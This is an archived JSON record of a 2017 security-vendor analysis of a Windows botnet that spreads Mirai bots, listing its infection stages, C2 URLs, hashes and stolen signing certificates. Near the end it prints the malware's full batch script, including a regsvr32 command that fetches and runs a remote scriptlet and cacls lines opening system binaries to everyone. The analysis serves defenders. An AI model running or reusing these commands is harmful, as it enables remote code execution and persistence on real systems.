{
    "id": "5bc37ace-5040-4871-b668-394f35dcf9ea",
    "created_at": "2023-01-12T15:10:33.724091Z",
    "updated_at": "2025-03-27T02:05:53.474275Z",
    "deleted_at": null,
    "sha1_hash": "dce3061e53838f976b12c9275cf8d14e75e24306",
    "title": "2017-02-21 - New(ish) Mirai Spreader Poses New Risks",
    "authors": "",
    "file_creation_date": "2022-05-28T02:02:12Z",
    "file_modification_date": "2022-05-28T02:02:12Z",
    "file_size": 360866,
    "plain_text": "# New(ish) Mirai Spreader Poses New Risks\n\n**[securelist.com/blog/research/77621/newish-mirai-spreader-poses-new-risks/](https://securelist.com/blog/research/77621/newish-mirai-spreader-poses-new-risks/)**\n\nAuthors\n\nGReAT\n\nA cross-platform win32-based Mirai spreader and botnet is in the wild and previously\ndiscussed publicly. However, there is much information confused together, as if an entirely\nnew IoT bot is spreading to and from Windows devices. This is not the case. Instead, an\naccurate assessment is that a previously active Windows botnet is spreading a Mirai bot\nvariant. So let’s make a level-headed assessment of what is really out there.\n\nThe earliest we observed this spreader variant pushing Mirai downloaders was January\n2017. But this Windows bot is not new. The Windows bot’s spreading method for Mirai is very\nlimited as well – it only delivers the Mirai bots to a Linux host from a Windows host if it\nsuccessfully brute forces a remote telnet connection. So we don’t have a sensational hop\nfrom Linux Mirai to Windows Mirai just yet, that’s just a silly statement. But we do have a new\nthreat and practical leverage of the monolithic Windows platform to further spread Mirai to\n\n\n-----\n\npreviously unavailable resources. In particular, vulnerable SQL servers running on Windows\ncan be a problem, because they can be Internet facing, and have access to private network\nconnecting IP-based cameras, DVR, media center software, and other internal devices.\n\nSo, we observe a previously active bot family that now spreads Mirai bots to embedded\nLinux systems over a very limited delivery vector. It spreads both its own bot code and the\nnew Mirai addition in stages, using multiple web resources and servers. These servers help\nprovide a better timeline of operation for the operator. One of the directly related web hosts\nat downs.b591[.]com has been serving bot components since at least August 2014. And\nmost of the bot’s [functionality clearly traces back to public sources at least as early as 2013.](https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/)\nIt’s not the freshest code or most impressive leap.\n\nRegardless, it’s unfortunate to see any sort of Mirai crossover between the Linux platform\nand the Windows platform. Much like the Zeus banking trojan source code release that\nbrought years of problems for the online community, the Mirai IoT bot source code release is\ngoing to bring heavy problems to the internet infrastructure for years to come, and this is just\na minor start.\n\nNotably, the 2016 Mirai operations were unique for two reasons:\n\nnewly practical exploitation and misuse of IoT devices (mainly DVR, CCTV cameras,\nand home routers) on a large scale\nrecord setting DDoS traffic generation, exceeding all previous volumes\n\nThe great volume of this Mirai-generated DDoS traffic in October 2016 took down a portion\nof the internet, and was severe enough to initiate investigations by the FBI and the DHS. At\nthe time, they had not ruled out nation states’ activity due to the overall power of the Mirai\nbotnets. But even those attacks were far from the work of nation states. Time will only tell if\nnation states choose to hide their destructive activity in plain sight in the Internet of Things –\nthe capabilities are clearly available. Could we see a nation state interested in taking down\nwide swaths of the internet using this juvenile toolset? It’s very possible.\n\nIn response to the huge problem this poses to the internet infrastructure, over the past few\nmonths, our team and CERT have participated in multiple successful command and control\ntakedown efforts that otherwise have posed problems for partners simply providing\nnotifications. While some security researchers may describe these takedowns as “whack a\nmole”, these efforts resulted in relief from Gbps DDoS storms for major networks. And, we\nare happy to partner with more network operators to leverage our connections with CERTs,\nLE, and other partners around the world to further enable this success.\n\n## The Windows Spreader – Who What Where\n\n\n-----\n\nThis Windows bot code is richer and more robust than the Mirai codebase, with a large set of\nspreading techniques, including brute forcing over telnet, SSH, WMI, SQL injection, and IPC\ntechniques. Some of the bot executables are signed with certificates stolen from Chinese\nmanufacturers. The code runs on Windows boxes, and checks in to a hardcoded list of c2 for\nhosts to scan and attack. Upon successful intrusion, it can spread the Linux Mirai variant as\nneeded over telnet. If tftp or wget are not present on the remote system, it attempts to copy a\ndownloader to the system and executes it there. This downloader will pull down and execute\nthe final Mirai bot. These devices include\n\nIP-based cameras\nDVR\nMedia center appliances\nVarious Raspberry and Banana Pi\n\nUnfortunately, this code is clearly the work of a more experienced bot herder, new to the\nMirai game, and possibly one that is not juvenile like the original Mirai operator set. Based on\nmultiple artefacts, the word choice from string artefacts, the code having been compiled on a\nChinese system, that the host servers are maintained in Taiwan, abuse of stolen codesigning certificates exclusively from Chinese companies, and other characteristics, it is likely\nthat this developer/operator is Chinese speaking.\n\nThe addition of a Chinese-speaking malware author with access to stolen code-signing\ncertificates, with the ability to rip win32 offensive code from multiple offensive projects\neffective against MSSQL servers around the world, and the ability to port the code into an\neffective cross-platform spreading bot, introduces a step up from the juvenile, stagnating, but\ndestructive Mirai botnet operations of 2016. It introduces newly available systems and\nnetwork for the further spread of Mirai bots. And it demonstrates the slow maturing of Mirai\nnow that the source is publicly available.\n\nBelow is a proportional comparison of the second stage component’s IP geolocations\n(fb7b79e9337565965303c159f399f41b), frequently downloaded by vulnerable MSSQL and\nMySQL servers. It is served from one of two web hosts, both hosted in Taiwan :\n\nhttp://down.mykings[.]pw:8888/ups.rar\n\nhttp://up.mykings[.]pw:8888/ups.rar\n\nWhen downloaded, it is copied to disk with one of several filenames and executed:\n\ncab.exe, ms.exe, cftmon.exe\n\nClearly, emerging markets with heavy investment in technology solutions are hit the heaviest\nby this component.\n\n\n-----\n\n## Components\n\nThe bot code and various components have been pulled together from other projects and\nprevious sources. At runtime, code delivery occurs in a series of stages, from scanning and\nattacking online resources to downloading additional configuration files, fetching further\ninstruction, and downloading and running additional executable code. Again, mostly all of\nthese components, techniques, and functionality are several years old and are very large file\nobjects.\n\nWindows Spreader Infection Process\ni.e. c:\\windows\\system\\msinfo.exe (5707f1e71da33a1ab9fe2796dbe3fc74)\nChanges DNS settings to 114.114.114.114, 8.8.8.8.\ndownloads and executes\nfrom hxxp://up.mykings[.]pw:8888/update.txt (02b0021e6cd5f82b8340ad37edc742a0)\nhxxp://up.mykings[.]pw:8888/ver.txt (bf3b211fa17a0eb4ca5dcdee4e0d1256)\n\n## Downloads\n\nhxxp://img1.timeface[.]cn/times/b27590a4b89d31dc0210c3158b82c175.jpg\n(b27590a4b89d31dc0210c3158b82c175) to c:\\windows\\system\\msinfo.exe\n(5707f1e71da33a1ab9fe2796dbe3fc74)\n\nand runs with command line parameters “-create” “-run”\n\nDownloads and executes hxxp://down.mykings[.]pw:8888/my1.html\n(64f0f4b45626e855b92a4764de62411b)\n\n\n-----\n\nThis file is a command shell script that registers a variety of files, including database\nconnectivity libraries, and cleans up unneeded traces of itself on the system.\n\nhttp://up.mykings[.]pw:8888/ups.rar (10164584800228de0003a37be3a61c4d)\n\nIt copies itself to the tasks directory, and installs itself as a scheduled job.\nc:\\windows\\system\\my1.bat\nc:\\windows\\tasks\\my1.job\nc:\\windows\\system\\upslist.txt\nc:\\windows\\system32\\cmd.exe /c sc start xWinWpdSrv&ping 127.0.0.1 -n 6 && del\nc:\\windows\\system\\msinfo.exe >> NUL\nc:\\program files\\kugou2010\\ms.exe (10164584800228de0003a37be3a61c4d)\n\nKeylogger (hosted as comments within jpeg files)\n\nThis botnet operator hosts components embedded within jpeg comments, a technique they\nhave been using since 2013. These techniques provide very large file objects. So, even a\nfresh image downloaded by this bot of Taylor Swift contains 2.3mb of keylogging code first\nseen 2016.10.30 (ad0496f544762a95af11f9314e434e94):\n\n\n-----\n\n## Modular bot code\n\nAlso interesting in this variant is the variety of its spreader capabilities in the form of blind\nSQLi (sql injection) and brute forcing techniques, compiled in from a “Cracker” library. This\nlibrary enables “tasking” of various attacks. The bots are instructed on individual tasks per an\nencrypted file downloaded from the available c2.\n\n[Cracker:IPC] [Cracker:MSSQL] [Cracker:MySQL] [Cracker:RDP] [Cracker:SSH]\n\n[Cracker:RDP] [Cracker:Telnet] [Cracker:WMI]\nThe Windows bot’s source appears to be developed in a fairly modular manner in C++, as\nfunctionality is broken out across source libraries:\n\n\n-----\n\nCheckUpdate.cpp\nCracker_Inline.cpp\nCracker_Standalone.cpp\ncService.cpp\nCThreadPool.cpp\nDb_Mysql.cpp\nDispatcher.cpp\nIpFetcher.cpp\nlibtelnet.cpp\nLogger_Stdout.cpp\nScanner_Tcp_Connect.cpp\nScanner_Tcp_Raw.cpp\nServerAgent.cpp\nTask_Crack_Ipc.cpp\nTask_Crack_Mssql.cpp\nTask_Crack_Mysql.cpp\nTask_Crack_Rdp.cpp\nTask_Crack_Ssh.cpp\nTask_Crack_Telnet.cpp\nTask_Crack_Wmi.cpp\nTask_Scan.cpp\nWPD.cpp\ncatdbsvc.cpp\ncatadnew.cpp\ncatdbcli.cpp\nwaitsvc.cpp\nerrlog.cpp\n\n## Code signing certificates\n\nThe code signing certificates appear to be stolen from a solar and semiconductor grinding\nwafer products manufacturer in Northwest China, and an expired one.\n\n\n-----\n\nKaspersky Lab products detect and prevent infections from these bots.\n\n## File object scan verdicts\n\nTrojan.Win32.SelfDel.ehlq\n\nTrojan.Win32.Agent.ikad\n\nTrojan.Win32.Agentb.btlt\n\nTrojan.Win32.Agentb.budb\n\nTrojan.Win32.Zapchast.ajbs\n\nTrojan.BAT.Starter.hj\n\nTrojan-PSW.Win32.Agent.lsmj\n\nTrojan-Downloader.Win32.Agent.hesn\n\nTrojan-Downloader.Win32.Agent.silgjn\n\n\n-----\n\nHEUR:Trojan-Downloader.Linux.Gafgyt.b\nBackdoor.Win32.Agent.dpeu\nDangerousPattern.Multi.Generic (UDS)\n\n## Behavioral verdicts\n\nTrojan.Win32.Generic\n\nTrojan.Win32.Bazon.a\n\nTrojan.Win32.Truebadur.a\n\nDangerousObject.Multi.Chupitio.a\n\n## Appendix\n\n### c2 and url\n\nhttp://dwon.f321y[.]com:280/mysql.exe\n\n[https://down2.b5w91[.]com:8443]\n\nhttp://down.f4321y[.]com:8888/kill.html\n\nhttp://down.f4321y[.]com:8888/test.html\n\nhttp://down.f4321y[.]com:8888/ups.rar\n\nhttp://67.229.225.20\nhttp://down.f4321y[.]com\n\nhttp://up.f4321y[.]com\n\nhttp://up.f4321y[.]com:8888/ver.txt\n\nhttp://up.f4321y[.]com:8888/ups.rar\n\nhttp://up.f4321y[.]com:8888/update.txt\n\nhttp://up.f4321y[.]com:8888/wpdmd5.txt\n\nhttp://up.f4321y[.]com:8888/wpd.dat\n\nhttp://down.F4321Y[.]com:8888/my1.html\n\nhttp://up.mykings[.]pw:8888/ver.txt\n\nhttp://up.mykings[.]pw:8888/ups.rar\n\nhttp://up.mykings[.]pw:8888/update.txt\n\nhttp://up.mykings[.]pw:8888/wpdmd5.txt\n\nhttp://up.mykings[.]pw:8888/wpd.dat\n\nhttp://down.mykings[.]pw:8888/my1.html\n\nhttp://down.mykings[.]pw:8888/ups.rar\n\nhttp://down.mykings[.]pw:8888/item.dat\n\nhttp://js.f4321y[.]com:280/v.sct\n\nhttp://down.b591[.]com:8888/ups.exe\n\nhttp://down.b591[.]com:8888/ups.rar\n\nhttp://down2.b591[.]com:8888/ups.rar\n\nhttp://down2.b591[.]com:8888/wpd.dat\n\nhttp://down2 b591[ ]com:8888/wpdmd5 txt\n\n\n-----\n\nhttp://down2.b591[.]com:8888/ver.txt\nhttp://up.f4321y[.]com:8888/ups.rar\n\n[http://down.b591[.]com:8888/test.html]\n\n[http://dwon.kill1234[.]com:280/cao.exe]\nhttp://down.b591[.]com:8888/ups.rar\nhttp://down.b591[.]com:8888/ups.exe\nhttp://down.b591[.]com:8888/cab.rar\nhttp://down.b591[.]com:8888/cacls.rar\nhttp://down.b591[.]com:8888/kill.html\n\n### Certificates\n\nXi’ an JingTech electronic Technology Co.,LTD\n\nsn: 65 f9 b9 66 60 ad 34 c1 c1 fe f2 97 26 6a 1b 36\n\nPartner Tech(Shanghai)Co.,Ltd\n\nsn: 26 59 63 33 50 73 23 10 40 17 81 35 53 05 97 60 39 76 89\n\n### Md5\n\ne7761db0f63bc09cf5e4193fd6926c5e\n\nc88ece9a379f4a714afaf5b8615fc66c\n91a12a4cf437589ba70b1687f5acad19\n\na3c09c2c3216a3a24dce18fd60a5ffc2\n\n297d1980ce171ddaeb7002bc020fe6b6\n\n5707f1e71da33a1ab9fe2796dbe3fc74\n\na4c7eb57bb7192a226ac0fb6a80f2164\n\n64f0f4b45626e855b92a4764de62411b\n\n02b0021e6cd5f82b8340ad37edc742a0\n\n10164584800228de0003a37be3a61c4d\n\nfd7f188b853d5eef3760228159698fd8\n\ncbe2648663ff1d548e036cbe4351be39\n\nfb7b79e9337565965303c159f399f41b\n\neb814d4e8473e75dcbb4b6c5ab1fa95b\n\n04eb90800dff297e74ba7b81630eb5f7\n\n508f53df8840f40296434dfb36087a17\n\n93ccd8225c8695cade5535726b0dd0b6\n\n62270a12707a4dcf1865ba766aeda9bc\n\n43e7580e15152b67112d3dad71c247ec\n\n0779a417e2bc6bfac28f4fb79293ec34\n\nac8d3581841b8c924a76e7e0d5fced8d\n\ncf1ba0472eed104bdf03a1712b3b8e3d\n\n4eee4cd06367b9eac405870ea2fd2094\n\n21d291a8027e6de5095f033d594685d0\n\n\n-----\n\n097d32a1dc4f8ca19a255c401c5ab2b6\n5950dfc2f350587a7e88fa012b3f8d92\n2d411f5f92984a95d4c93c5873d9ae00\n9a83639881c1a707d8bbd70f871004a0\n5cae130b4ee424ba9d9fa62cf1218679\n2346135f2794de4734b9d9a27dc850e1\nfe7d9bdbf6f314b471f89f17b35bfbcd\nc289c15d0f7e694382a7e0a2dc8bdfd8\n9098e520c4c1255299a2512e5e1135ba\ndb2a34ac873177b297208719fad97ffa\ndefff110df48eb72c16ce88ffb3b2207\nc289c15d0f7e694382a7e0a2dc8bdfd8\nc75bd297b87d71c8c73e6e27348c67d5\n5af3bab901735575d5d0958921174b17\n1a6fea56dc4ee1c445054e6bc208ce4f\nae173e8562f6babacb8e09d0d6c29276\nad0496f544762a95af11f9314e434e94\n\n**Contents of http://down.mykings[.]pw:8888/my1.html**\n\n@echo off\nmode con: cols=13 lines=1\nif exist C:\\downs\\runs.exe start C:\\downs\\runs.exe\nmd C:\\Progra~1\\shengda\nmd C:\\Progra~1\\kugou2010\nmd C:\\download\nregsvr32 /s shell32.dll\nregsvr32 /s WSHom.Ocx\nregsvr32 /s scrrun.dll\nregsvr32 /s c:\\Progra~1\\Common~1\\System\\Ado\\Msado15.dll\nregsvr32 /s jscript.dll\nregsvr32 /s vbscript.dll\nstart regsvr32 /u /s /i:http://js.f4321y[.]com:280/v.sct scrobj.dll\nattrib +s +h C:\\Progra~1\\shengda\nattrib +s +h C:\\Progra~1\\kugou2010\nattrib +s +h C:\\download\ncacls cmd.exe /e /g system:f\ncacls cmd.exe /e /g everyone:f\ncacls ftp.exe /e /g system:f\ncacls ftp.exe /e /g everyone:f\ncacls c:\\windows\\help\\akpls.exe /e /g system:f\ncacls c:\\windows\\help\\akpls.exe /e /g everyone:f\ncacls C:\\Progra~1\\Common~1\\System\\ado\\msado15.dll /e /g system:f\n\n\n-----\n\ncacls C:\\Progra~1\\Common~1\\System\\ado\\msado15.dll /e /g everyone:f\nreg delete “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v shell /f\ndel c:\\windows\\system32\\wbem\\se.bat\ndel c:\\windows\\system32\\wbem\\12345.bat\ndel c:\\windows\\system32\\wbem\\123456.bat\ndel c:\\windows\\system32\\wbem\\1234.bat\ndel c:\\windows\\system32\\*.log\ndel %0\nexit\n\n**Contents of http://up.mykings[.]pw:8888/update.txt**\n\nhttp://img1.timeface[.]cn/times/b27590a4b89d31dc0210c3158b82c175.jpg\nc:\\windows\\system\\msinfo.exe\n\nhttp://down.mykings[.]pw:8888/my1.html c:\\windows\\system\\my1.bat\n\n### Relevant Links\n\n[https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/](https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/)\n\n[https://isc.sans.edu/diary/21543](https://isc.sans.edu/diary/21543)\n\n[http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html?m=1](http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html?m=1)\n\n[https://securelist.com/blog/research/76954/is-mirai-really-as-black-as-its-being-painted/](https://securelist.com/blog/research/76954/is-mirai-really-as-black-as-its-being-painted/)\n\n[https://threatpost.com/mirai-fueled-iot-botnet-behind-ddos-attacks-on-dns-providers/121475/](https://threatpost.com/mirai-fueled-iot-botnet-behind-ddos-attacks-on-dns-providers/121475/)\n\n[https://securelist.com/analysis/quarterly-malware-reports/77412/ddos-attacks-in-q4-2016/](https://securelist.com/analysis/quarterly-malware-reports/77412/ddos-attacks-in-q4-2016/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-21 - New(ish) Mirai Spreader Poses New Risks.pdf"
    ],
    "report_names": [
        "2017-02-21 - New(ish) Mirai Spreader Poses New Risks.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536233,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653703332,
    "ts_modification_date": 1653703332,
    "files": {
        "pdf": "https://archive.orkl.eu/dce3061e53838f976b12c9275cf8d14e75e24306.pdf",
        "text": "https://archive.orkl.eu/dce3061e53838f976b12c9275cf8d14e75e24306.txt",
        "img": "https://archive.orkl.eu/dce3061e53838f976b12c9275cf8d14e75e24306.jpg"
    }
}